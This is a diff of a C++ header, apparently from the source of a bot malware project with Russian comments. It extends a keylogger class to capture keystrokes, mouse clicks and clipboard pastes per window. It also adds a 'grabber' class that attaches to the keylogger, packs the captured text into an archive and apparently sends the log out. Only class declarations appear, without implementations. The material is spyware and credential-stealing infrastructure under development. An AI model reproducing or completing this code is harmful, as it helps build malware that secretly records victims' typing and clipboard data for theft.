@@ -12,22 +12,39 @@
 
 
 
+class TKeyLogger;
+class TGrabber;
+
+
+
+
+
 //********************************************************
 //   TKeyLogger - Базовый класс келогера
 //********************************************************
-class TKeyLogger : public TBotObject
+class TKeyLogger : public TEventContainer
 {
+private:
+	TGrabber* FGrabber;
 public:
 	TKeyLogger();
 	virtual ~TKeyLogger();
 
+	// Функция возвращает истину если к кейлогеру подключен грабер
+	bool Active();
+
 	// Функция записывает лог от клавиатуры
-	bool WriteKeyboard(HWND Wnd, const char* Text);
+	bool LogKeyboard(HWND Wnd, const char* Text);
 
-	// функция записывает лог от мыши
-	bool WriteMouse(HWND Wnd, int X, int Y, int Button);
+	// Функция логирует вставку из буфера обмена
+	void LogClipboard(const char* Text);
+
+	// функция логирует события мыши
+	bool LogMouse(HWND Wnd, int X, int Y, int Button);
 
 
+    bool ConnectGrabber(TGrabber* Grabber);
+    bool DisconnectGrabber(TGrabber* Grabber);
 };
 
 
@@ -40,7 +57,6 @@ public:
 //  общий текстовый файл.
 //
 //********************************************************
-
 class TInfiniteKeyLogger : public TBotObject
 {
 private:
@@ -64,6 +80,34 @@ public:
 	//--------------------------------------------
 	bool static Activated();
 };
+
+
+
+//********************************************************
+//  TGrabber - Базовый класс грабера
+//********************************************************
+class TGrabber : public TBotObject
+{
+private:
+	string      FName;
+	TKeyLogger* FKeyLogger;
+	LPVOID      FCab;
+	string      FCabFileName;
+
+	friend class TKeyLogger;
+protected:
+	void virtual LogKeyboad(HWND Wnd, const char* Text) {  };
+	void virtual LogClipboard(HWND Wnd, const char* Text);
+
+	LPVOID OpenCab();
+	void   CloseCab(bool SendLog);
+public:
+	TGrabber(const string& GrabberName);
+	~TGrabber();
+	bool ConnectToKeyLogger();
+	bool DisconnectFromKeyLogger();
+};
+
 
 
 //---------------------------------------------------------------------------
